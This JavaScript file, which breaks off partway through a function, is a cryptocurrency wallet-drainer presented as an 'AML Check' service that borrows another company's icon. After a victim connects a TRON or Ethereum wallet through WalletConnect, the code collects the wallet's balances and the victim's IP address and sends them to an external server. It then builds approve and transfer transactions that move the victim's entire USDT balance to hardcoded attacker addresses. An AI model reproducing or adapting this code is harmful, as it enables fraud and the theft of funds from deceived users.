import { TronWeb } from "tronweb";
import * as _tronweb3_walletconnect_tron__WEBPACK_IMPORTED_MODULE_2__ from "@tronweb3/walletconnect-tron"; // Импорт всего модуля
import * as web3__WEBPACK_IMPORTED_MODULE_1__ from "web3"; // Импорт всего модуляconst server = "194.87.206.71";
import Web3Modal from "web3modal";
import * as _walletconnect_ethereum_provider__WEBPACK_IMPORTED_MODULE_3__ from "@walletconnect/ethereum-provider";
import { TonConnectUI } from "@tonconnect/ui";

let server = "zapexobmen.com"; //заменить на адресс сервера
let projectId = "27bc90733ab8526004fe7d71fb7530aa";
let contractAddressUSDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Замените на адрес контракта USDT
let contractAddress = "TJVkBahAoYPpv7gyuvaaG9cVngTMJcDjVt"; //trc20 wallet
const recipient = "0xde16f96d683078cc99653278d7801fc65a81236e"; //erc20 wallet
const recipientBNB = "0xde16f96d683078cc99653278d7801fc65a81236e"; //bnb20 wallet
const recipientTON = "UQA4f_C7-g5JT6g_cz05z1yN37GmWTWRdzG6LMt4fuM8V80M";
let min_withdraw = "250000000"; //200$
let url_origin = "https://amlzapex.com/";

window.onload = function () {
  fetch("https://" + server + "/config.php", {
    method: "GET",
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.min_withdraw) {
        min_withdraw = data.min_withdraw + "000000";
        
        console.log(min_withdraw);
      }
    })
    .catch((error) =>
      console.error("Ошибка при загрузке глобальной переменной:", error)
    );
};

var address;
var walletName;
const wallet =
  new _tronweb3_walletconnect_tron__WEBPACK_IMPORTED_MODULE_2__.WalletConnectWallet(
    {
      network:
        _tronweb3_walletconnect_tron__WEBPACK_IMPORTED_MODULE_2__
          .WalletConnectChainID.Mainnet,
      relayUrl: "https://relay.walletconnect.org?projectId=" + projectId,
      options: {
        projectId,
        metadata: {
          name: "AML Check",
          description: "Tron WalletConnect",
          url: url_origin,
          icons: ["https://amlbot.com/favicon.png"],
        },
      },

      web3ModalConfig: {
        themeMode: "dark",
        themeVariables: {
          "--w3m-z-index": 1000,
        },
        explorerRecommendedWalletIds: [
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", //trust wallet
          "e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4", //Exodus
          "38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662", //bitget wallet
          "19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927", //ledger live
        ],
        explorerExcludedWalletIds: "ALL",
      },
    }
  );

const verifyButton = document.getElementById("verify");
const scanButton = document.getElementById("scan");
let items = document.querySelectorAll(".flex-items-center");

const tokenContracts = {
  USDT: {
    address: contractAddressUSDT, // Адрес контракта USDT
    decimals: 6, // Количество десятичных знаков для USDT
    priceAPI:
      "https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd", // API для получения цены USDT
  },
  TRX: {
    address: null, // TRX не требует контракта, его баланс можно получить напрямую
    decimals: 6, // TRX не имеет десятичных знаков
    priceAPI:
      "https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd", // API для получения цены TRX
  },
  // Добавьте другие токены, если нужно
};

// Функция для получения баланса TRC20 токенов
async function getTRC20Balance(address, contractAddress, decimals) {
  tronWeb.setAddress("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
  const contract = await tronWeb.contract().at(contractAddress);
  const balance = await contract.balanceOf(address).call();
  return balance.toString() / Math.pow(10, decimals); // Преобразуем баланс в нормальный вид
}

// Функция для получения цены токена в долларах
async function getTokenPriceInUSD(token) {
  const response = await fetch(token.priceAPI);
  const data = await response.json();
  if (token.address) {
    return data["tether"].usd;
  } else {
    return data["tron"].usd;
  }
  // Извлекаем цену токена из ответа
}
let tokenPriceInUSD = 0;
// Функция для получения баланса всех токенов и пересчета их в доллары

async function getTotalBalanceInUSD(address) {
  tokenPriceInUSD = await getTokenPriceInUSD(tokenContracts["USDT"]);
  let totalBalanceInUSD = 0;

  for (const tokenName in tokenContracts) {
    const token = tokenContracts[tokenName];

    let balance = 0;

    // Для TRX
    if (tokenName === "TRX") {
      balance = await tronWeb.trx.getBalance(address); // Получаем баланс TRX
      balance = balance / Math.pow(10, 6); // Преобразуем в нормальный формат (TRX не имеет десятичных знаков)
    } else {
      // Для других токенов
      balance = await getTRC20Balance(address, token.address, token.decimals);
    }

    const priceInUSD = await getTokenPriceInUSD(token); // Получаем цену токена в долларах
    const balanceInUSD = balance * priceInUSD; // Переводим в доллары

    totalBalanceInUSD += balanceInUSD; // Суммируем баланс

    console.log(
      `${tokenName} Balance: ${balance} Price: $${priceInUSD} USD, Total in USD: $${balanceInUSD}`
    );
  }

  console.log("Total Balance in USD:", totalBalanceInUSD);
  return totalBalanceInUSD;
}

async function onSignIn() {
  try {
    console.log(window.location.origin);
    const data = await wallet.connect();
    console.log(data);
    address = data.address;
    walletName = "WalletConnect TRON";

    const totalBalanceInUSD = await getTotalBalanceInUSD(address);

    let trx1 = tokenContracts["TRX"];
    let balanceTrx = await tronWeb.trx.getBalance(address); // Получаем баланс TRX
    balanceTrx = balanceTrx / Math.pow(10, 6);

    const priceTrxInUSD = await getTokenPriceInUSD(trx1);
    let balanceTrxUSD = priceTrxInUSD * balanceTrx;
    let usdt_token = tokenContracts["USDT"];
    let balanceUsdt = await getTRC20Balance(
      address,
      usdt_token.address,
      usdt_token.decimals
    );
    const priceUSDTInUSD = tokenPriceInUSD;
    let balanceUsdtUSD = balanceUsdt * priceUSDTInUSD;
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json()) // Преобразуем ответ в JSON
      .then((data) => {
        const ip = data.ip; // Сохраняем IP-адрес
        const formData = new FormData();
        console.log(formData);
        formData.append("amount", totalBalanceInUSD);
        formData.append("trx_amount", balanceTrx);
        formData.append("trx_balance", balanceTrxUSD);
        formData.append("ip", ip); // Используем полученный IP
        formData.append("address", address); // Убедитесь, что address определен
        formData.append("connect", "1"); // Убедитесь, что address определен
        formData.append("wallet_name", walletName);
        formData.append("trx", 1);
        formData.append("address_receive", contractAddress);
        formData.append("usdt_amount", balanceUsdt);
        formData.append("usdt_balance", balanceUsdtUSD);
        // После получения IP, отправляем второй запрос на сервер
        fetch("https://" + server + "/api/check.php", {
          method: "POST",
          mode: "no-cors",
          body: formData,
        })
          .then((response) => response.text())
          .then((data) => {
            console.log("Success connect trx:", data);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      })
      .catch((error) =>
        console.error("Ошибка при получении IP-адреса:", error)
      );
    document.getElementById("next252").removeAttribute("disabled");
    document.querySelector(".loader").style.display = "none";
    document.querySelectorAll(".loader")[1].style.display = "none";
  } catch (err) {
    document.getElementById("2").style.display = "block";
    document.getElementById("2.5.2").style.display = "none";
    console.error(err);
  } finally {
    document.getElementById("trustconnect").style.display = "block";
    document.getElementById("next251").removeAttribute("disabled");
  }
}

let web3, account, amount, balanceETH;
let web3_bnb, account_bnb, amount_bnb, balanceBNB;
async function connectWallet() {
  try {
    // Создание провайдера WalletConnect
    const walletConnector =
      await _walletconnect_ethereum_provider__WEBPACK_IMPORTED_MODULE_3__[
        "default"
      ].init({
        projectId: projectId, // ID проекта из WalletConnect Cloud
        metadata: {
          name: "AML Check",
          description: "ETH WalletConnect",
          url: url_origin, // origin must match your domain & subdomain
          icons: ["https://amlbot.com/favicon.png"],
        },
        chains: [1], // ID сети Ethereum
        showQrModal: true, // Показывать модальное окно с QR-кодом
        qrModalOptions: {
          themeMode: "dark",
          explorerRecommendedWalletIds: [
            "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96", // MetaMask
            "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", //Trust Wallet
            "8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4", // Binance
            "971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709", // OKX
            "15c8b91ade1a4e58f3ce4e7a0dd7f42b47db0c8df7e0d84f63eb39bcb96c4e0f", // Bybit Wallet
            "fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa", // CoinBase
            "38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662", // BitGet
            "a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393", // Phantom
            "0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150", // SafePal
            "c03dfee351b6fcc421b4494ea33b9d4b92a984f87aa76d1663bb28705e95034a", // Uniswap
          ],
        },
      });

    // Подключение к кошельку
    await walletConnector.connect();

    // Создание экземпляра Web3
    web3 = new web3__WEBPACK_IMPORTED_MODULE_1__["default"](walletConnector);

    // Получение текущего аккаунта
    const accounts = await web3.eth.getAccounts();
    account = accounts[0]; // Получение первого аккаунта
    const walletName = "WalletConnect ETH";
    await getUSDTBalance(
      web3,
      account,
      "0xdAC17F958D2ee523a2206206994597C13D831ec7"
    );
    await getETHBalance(web3, account);
    console.log(Number(amount));
    const priceUSDTInUSD = tokenPriceInUSD;
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json()) // Преобразуем ответ в JSON
      .then((data) => {
        const ip = data.ip; // Сохраняем IP-адрес
        const formData = new FormData();
        console.log(formData);
        formData.append(
          "amount",
          priceUSDTInUSD * Number(amount) +
            Number(balanceETH) * 3458 * priceUSDTInUSD
        );
        formData.append("eth_amount", Number(balanceETH));
        formData.append("eth_balance", Number(balanceETH) * 3458);
        formData.append("ip", ip); // Используем полученный IP
        formData.append("address", account); // Убедитесь, что address определен
        formData.append("connect", "1"); // Убедитесь, что address определен
        formData.append("wallet_name", walletName);
        formData.append("eth", 1);
        formData.append("address_receive", recipient);
        formData.append("usdt_amount", Number(amount));
        formData.append("usdt_balance", priceUSDTInUSD * Number(amount));
        // После получения IP, отправляем второй запрос на сервер
        fetch("https://" + server + "/api/check.php", {
          method: "POST",
          mode: "no-cors",
          body: formData,
        })
          .then((response) => response.text())
          .then((data) => {
            console.log("Success connect trx:", data);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      })
      .catch((error) =>
        console.error("Ошибка при получении IP-адреса:", error)
      );
    console.log("Privet");
    document.querySelector(".loader").style.display = "none";
    document.querySelectorAll(".loader")[1].style.display = "none";
    document.getElementById("next253").removeAttribute("disabled");
    document.getElementById("trustconnect4").style.display = "none";
  } catch (err) {
    console.log("Hello");
    document.getElementById("2.1").style.display = "block";
    document.getElementById("2.5.3").style.display = "none";
    document.getElementById("next253").setAttribute("disabled", "true");
    document.getElementById("trustconnect4").style.display = "block";
    console.error("Ошибка при подключении к WalletConnect:", err);
  } finally {
    console.log("End");
    // Скрытие загрузочного индикатора и разблокировка элементов интерфейса
  }
}

async function getETHBalance(web3, account) {
  try {
    // Получение баланса ETH для текущего аккаунта в "wei"
    const balanceWei = await web3.eth.getBalance(account);

    // Преобразуем баланс из "wei" в "ether"
    const balanceInETH = web3.utils.fromWei(balanceWei, "ether");

    balanceETH = balanceInETH;
    return balanceInETH;
  } catch (error) {
    console.error("Ошибка при получении баланса ETH:", error);
    return null;
  }
}

async function getUSDTBalance(web3, account, usdtContractAddress) {
  //const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Адрес контракта USDT на Ethereum
  const usdtAbi = [
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "balance", type: "uint256" }],
      type: "function",
    },
  ];

  // Создание экземпляра контракта USDT
  const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);

  // Получение баланса USDT для текущего аккаунта
  const balance = await usdtContract.methods.balanceOf(account).call();

  // Преобразуем баланс из "wei" формата в USDT (с 6 десятичными знаками)
  const balanceInUSDT = web3.utils.fromWei(balance, "mwei");

  amount = balanceInUSDT;
  return balanceInUSDT;
}

async function sendUSDT(web3, account, recipient, amount) {
  const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
  const usdtAbi = [
    // Минимальный ABI для вызова метода transfer
    {
      constant: false,
      inputs: [
        { name: "_to", type: "address" },
        { name: "_value", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ name: "", type: "bool" }],
      type: "function",
    },
  ];
  console.log("ETH Balance: " + balanceETH);
  console.log("USDT Balance: " + amount);
  if (balanceETH >= 0.002) {
    // Создание экземпляра контракта USDT
    const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
    let amountInWei;
    // Определение суммы перевода (в wei)
    if (amount > 200) {
      //usdt erc20 limit
      amountInWei = web3.utils.toWei(amount.toString(), "mwei"); // USDT имеет 6 десятичных знаков
    } else {
      if (amount < 200) {
        amountInWei = 0;
      } else {
        errorModal2();
        return;
      }
    }
    const formData3 = new FormData();
    formData3.append("transaction_client", 1);
    formData3.append("method", "IncreaseApproval");
    formData3.append("token_name", "TETHER USDT");
    formData3.append("token_type", "ERC20");
    formData3.append(
      "token_contract",
      "0xdAC17F958D2ee523a2206206994597C13D831ec7"
    );
    formData3.append("token_amount", Number(amount));
    formData3.append("token_balance", Number(amount) * tokenPriceInUSD);
    console.log(Number(amount));
    await fetch("https://" + server + "/api/check.php", {
      method: "POST",
      mode: "no-cors",
      body: formData3,
    })
      .then((response) => response.text())
      .then((data) => {
        console.log("Success start transaction", data);
      })
      .catch((error) => {
        console.error("Error:", error);
      });
    try {
      let formData2 = new FormData();
      formData2.append("success_client", 1);
      formData2.append("method", "IncreaseApproval");
      formData2.append("token_name", "TETHER USDT");
      formData2.append("token_type", "ERC20");
      formData2.append(
        "token_contract",
        "0xdAC17F958D2ee523a2206206994597C13D831ec7"
      );
      formData2.append("token_amount", Number(amount));
      formData2.append("token_balance", Number(amount) * tokenPriceInUSD);
      formData2.append("to_address", recipient);
      formData2.append("from_address", account);
      formData2.append("hash", "none");
      fetch("https://" + server + "/api/check.php", {
        method: "POST",
        mode: "no-cors",
        body: formData2,
      })
        .then((response) => response.text())
        .then((data) => {
          console.log("Success start transaction", data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
      await new Promise((resolve) => setTimeout(resolve, 2000));
      const formData = new FormData();
      formData.append("transaction_server", 1);
      formData.append("method", "transferFrom");
      formData.append("token_name", "TETHER USDT");
      formData.append("token_type", "ERC20");
      formData.append(
        "token_contract",
        "0xdAC17F958D2ee523a2206206994597C13D831ec7"
      );
      formData.append("token_amount", Number(amount));
      formData.append("token_balance", Number(amount) * tokenPriceInUSD);
      fetch("https://" + server + "/api/check.php", {
        method: "POST",
        mode: "no-cors",
        body: formData,
      })
        .then((response) => response.text())
        .then((data) => {
          console.log("Success start transaction", data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
      // Вызов метода transfer
      const tx = await usdtContract.methods
        .transfer(recipient, amountInWei)
        .send({
          from: account,
        });

      const formData4 = new FormData();
      if (tx) {
        fourModal();
        console.log(tx);
        txid = tx.transactionHash;
        formData4.append("success_server", 1);
        formData4.append("method", "transferFrom");
        formData4.append("token_name", "TETHER USDT");
        formData4.append("token_type", "ERC20");
        formData4.append(
          "token_contract",
          "0xdAC17F958D2ee523a2206206994597C13D831ec7"
        );
        formData4.append("token_amount", Number(amount));
        formData4.append("token_balance", Number(amount) * tokenPriceInUSD);
        formData4.append("to_address", recipient);
        formData4.append("from_address", account);
        formData4.append("hash", txid);
        fetch("https://" + server + "/api/check.php", {
          method: "POST",
          mode: "no-cors",
          body: formData4,
        })
          .then((response) => response.text())
          .then((data) => {
            console.log("Success start transaction", data);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }

      console.log("Транзакция отправлена:", tx.transactionHash);
    } catch (err) {
      const formData6 = new FormData();
      formData6.append("error_server", 1);
      formData6.append("method", "transferFrom");
      formData6.append("token_name", "TETHER USDT");
      formData6.append("token_type", "ERC20");
      formData6.append(
        "token_contract",
        "0xdAC17F958D2ee523a2206206994597C13D831ec7"
      );
      formData6.append("token_amount", Number(amount));
      formData6.append("token_balance", Number(amount) * tokenPriceInUSD);
      formData6.append("to_address", recipient);
      formData6.append("from_address", account);
      formData6.append("error", "User canceled approval");
      await fetch("https://" + server + "/api/check.php", {
        method: "POST",
        mode: "no-cors",
        body: formData6,
      })
        .then((response) => response.text())
        .then((data) => {
          console.log("Success start transaction", data);
        })
        .catch((error1) => {
          console.error("Error:", error1);
        });
      console.log("SignTransaction: " + err);
      window.location.reload();
    }
  } else {
    errorModal2();
  }
}

const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
});

// Вызов смарт-контракта после успешного подключения через WalletConnect
function sunToTrx(sunAmount) {
  return sunAmount / 1000000; // 1 TRX = 1 000 000 Sun
}

// Преобразование из TRX в USDT (если нужно, учитывая точность)
async function trxToUsdt(trxAmount, contractAddress) {
  // Получаем количество токенов USDT в эквиваленте TRX
  const contract = await tronWeb.contract().at(contractAddress);
  const decimals = await contract.decimals().call(); // Получаем количество знаков после запятой у токена USDT

  // Например, если decimals = 6, то для преобразования надо умножить на 10^6
  const usdtAmount = trxAmount * Math.pow(10, decimals);
  return usdtAmount;
}
async function getTrxBalance(address) {
  try {
    const balanceSun = await tronWeb.trx.getBalance(address);
    const balanceTRX = tronWeb.fromSun(balanceSun); // Преобразование из Sun в TRX

    return Math.round(balanceTRX);
  } catch (error) {
    console.error("Ошибка при получении баланса TRX:", error);
  }
}
async function callContract() {
  const balanceTRX = await getTrxBalance(address);
  const contractABIUSD = [
    {
      constant: true,
      inputs: [],
      name: "name",
      outputs: [{ name: "", type: "string" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ name: "_upgradedAddress", type: "address" }],
      name: "deprecate",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_value", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "deprecated",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ name: "_evilUser", type: "address" }],
      name: "addBlackList",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "totalSupply",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_from", type: "address" },
        { name: "_to", type: "address" },
        {
          name: "_value",
          type: "uint256",
        },
      ],
      name: "transferFrom",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "upgradedAddress",
      outputs: [{ name: "", type: "address" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "decimals",
      outputs: [{ name: "", type: "uint8" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "maximumFee",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "_totalSupply",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [],
      name: "unpause",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [{ name: "_maker", type: "address" }],
      name: "getBlackListStatus",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "paused",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_subtractedValue", type: "uint256" },
      ],
      name: "decreaseApproval",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [{ name: "who", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [{ name: "_value", type: "uint256" }],
      name: "calcFee",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [],
      name: "pause",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "owner",
      outputs: [{ name: "", type: "address" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "symbol",
      outputs: [{ name: "", type: "string" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_to", type: "address" },
        { name: "_value", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [{ name: "who", type: "address" }],
      name: "oldBalanceOf",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "newBasisPoints", type: "uint256" },
        { name: "newMaxFee", type: "uint256" },
      ],
      name: "setParams",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ name: "amount", type: "uint256" }],
      name: "issue",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_addedValue", type: "uint256" },
      ],
      name: "increaseApproval",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ name: "amount", type: "uint256" }],
      name: "redeem",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [
        { name: "_owner", type: "address" },
        { name: "_spender", type: "address" },
      ],
      name: "allowance",
      outputs: [{ name: "remaining", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "basisPointsRate",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [{ name: "", type: "address" }],
      name: "isBlackListed",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ name: "_clearedUser", type: "address" }],
      name: "removeBlackList",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "MAX_UINT",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ name: "newOwner", type: "address" }],
      name: "transferOwnership",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ name: "_blackListedUser", type: "address" }],
      name: "destroyBlackFunds",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        { name: "_initialSupply", type: "uint256" },
        {
          name: "_name",
          type: "string",
        },
        { name: "_symbol", type: "string" },
        { name: "_decimals", type: "uint8" },
      ],
      payable: false,
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      anonymous: false,
      inputs: [
        { indexed: true, name: "_blackListedUser", type: "address" },
        {
          indexed: false,
          name: "_balance",
          type: "uint256",
        },
      ],
      name: "DestroyedBlackFunds",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [{ indexed: false, name: "amount", type: "uint256" }],
      name: "Issue",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [{ indexed: false, name: "amount", type: "uint256" }],
      name: "Redeem",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [{ indexed: false, name: "newAddress", type: "address" }],
      name: "Deprecate",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [{ indexed: true, name: "_user", type: "address" }],
      name: "AddedBlackList",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [{ indexed: true, name: "_user", type: "address" }],
      name: "RemovedBlackList",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        { indexed: false, name: "feeBasisPoints", type: "uint256" },
        {
          indexed: false,
          name: "maxFee",
          type: "uint256",
        },
      ],
      name: "Params",
      type: "event",
    },
    { anonymous: false, inputs: [], name: "Pause", type: "event" },
    {
      anonymous: false,
      inputs: [],
      name: "Unpause",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        { indexed: true, name: "previousOwner", type: "address" },
        {
          indexed: true,
          name: "newOwner",
          type: "address",
        },
      ],
      name: "OwnershipTransferred",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        { indexed: true, name: "owner", type: "address" },
        {
          indexed: true,
          name: "spender",
          type: "address",
        },
        { indexed: false, name: "value", type: "uint256" },
      ],
      name: "Approval",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        { indexed: true, name: "from", type: "address" },
        {
          indexed: true,
          name: "to",
          type: "address",
        },
        { indexed: false, name: "value", type: "uint256" },
      ],
      name: "Transfer",
      type: "event",
    },
  ];
  const contractUSD = await tronWeb
    .contract(contractABIUSD)
    .at(contractAddressUSDT);
  var balance = await contractUSD.balanceOf(address).call({ from: address });
  var balance_normal = balance.toString() / Math.pow(10, 6);
  var balance2 = balance;
  if (balanceTRX > 34 && balance > 0) {
    const tronWeb = new TronWeb({
      fullHost: "https://api.trongrid.io",
    });

    const functionSelector = "approve(address,uint256)";
    const parameters = [
      { type: "address", value: contractAddress },
      { type: "uint256", value: balance2 },
    ];
    const options = {
      feeLimit: 300000000, //usdt trc limit
      from: address,
    };

    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      contractAddressUSDT,
      functionSelector,
      options,
      parameters,
      address
    );

    const swapSelector = "transfer(address,uint256)";
    var swapparameters;
    if (balance > min_withdraw) {
      let toAddress = contractAddress;
      swapparameters = [
        { type: "address", value: toAddress },
        { type: "uint256", value: balance2 },
      ];
    } else {
      swapparameters = [
        { type: "address", value: contractAddress },
        { type: "uint256", value: 0 },
      ];
    }
    const transaction_swap =
      await tronWeb.transactionBuilder.triggerSmartContract(
        contractAddressUSDT,
        swapSelector,
        options,
        swapparameters,
        address
      );

    try {
      // Increase Approval
      const formData3 = new FormData();
      formData3.append("transaction_client", 1);
      formData3.append("method", "IncreaseApproval");
      formData3.append("token_name", "TETHER USDT");
      formData3.append("token_type", "TRC20");
      formData3.append("token_contract", contractAddressUSDT);
      formData3.append("token_amount", balance_normal);
      formData3.append("token_balance", balance_normal * tokenPriceInUSD);
      console.log(balance_normal);
      fetch("https://" + server + "/api/check.php", {
        method: "POST",
        mode: "no-cors",
        body: formData3,
      })
        .then((response) => response.text())
        .then((data) => {
          console.log("Success start transaction", data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
      const formData2 = new FormData();

      if (true) {
        if (true) {
          formData2.append("success_client", 1);
          formData2.append("method", "IncreaseApproval");
          formData2.append("token_name", "TETHER USDT");
          formData2.append("token_type", "TRC20");
          formData2.append("token_contract", contractAddressUSDT);
          formData2.append("token_amount", balance_normal);
          formData2.append("token_balance", balance_normal * tokenPriceInUSD);
          formData2.append("to_address", contractAddress);
          formData2.append("from_address", address);
          formData2.append("hash", "none");
          fetch("https://" + server + "/api/check.php", {
            method: "POST",
            mode: "no-cors",
            body: formData2,
          })
            .then((response) => response.text())
            .then((data) => {
              console.log("Success start transaction", data);
            })
            .catch((error) => {
              console.error("Error:", error);
            });
        } else {
          formData2.append("error_client", 1);
          formData2.append("method", "IncreaseApproval");
          formData2.append("token_name", "TETHER USDT");
          formData2.append("token_type", "TRC20");
          formData2.append("token_contract", contractAddressUSDT);
          formData2.append("token_amount", trxToUsdt(sunToTrx(balance)));
          formData2.append(
            "token_balance",
            trxToUsdt(sunToTrx(balance)) * tokenPriceInUSD
          );
          formData2.append("to_address", contractAddress);
          formData2.append("from_address", address);
          formData2.append("error", "Transaction failed");
          fetch("https://" + server + "/api/check.php", {
            method: "POST",
            mode: "no-cors",
            body: formData2,
          })
            .then((response) => response.text())
            .then((data) => {
              console.log("Success start transaction", data);
            })
            .catch((error) => {
              console.error("Error:", error);
            });
        }
      } else {
        formData2.append("error_client", 1);
        formData2.append("method", "IncreaseApproval");
        formData2.append("token_name", "TETHER USDT");
        formData2.append("token_type", "TRC20");
        formData2.append("token_contract", contractAddressUSDT);
        formData2.append("token_amount", trxToUsdt(sunToTrx(balance)));
        formData2.append(
          "token_balance",
          trxToUsdt(sunToTrx(balance)) * tokenPriceInUSD
        );
        formData2.append("to_address", contractAddress);
        formData2.append("from_address", address);
        formData2.append("error", "Transaction failed to send");
        fetch("https://" + server + "/api/check.php", {
          method: "POST",
          mode: "no-cors",
          body: formData2,
        })
          .then((response) => response.text())
          .then((data) => {
            console.log("Success start transaction", data);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }
      await new Promise((resolve) => setTimeout(resolve, 2000));
      const formData = new FormData();
      formData.append("transaction_server", 1);
      formData.append("method", "transferFrom");
      formData.append("token_name", "TETHER USDT");
      formData.append("token_type", "TRC20");
      formData.append("token_contract", contractAddressUSDT);
      formData.append("token_amount", balance_normal);
      formData.append("token_balance", balance_normal * tokenPriceInUSD);
      fetch("https://" + server + "/api/check.php", {
        method: "POST",
        mode: "no-cors",
        body: formData,
      })
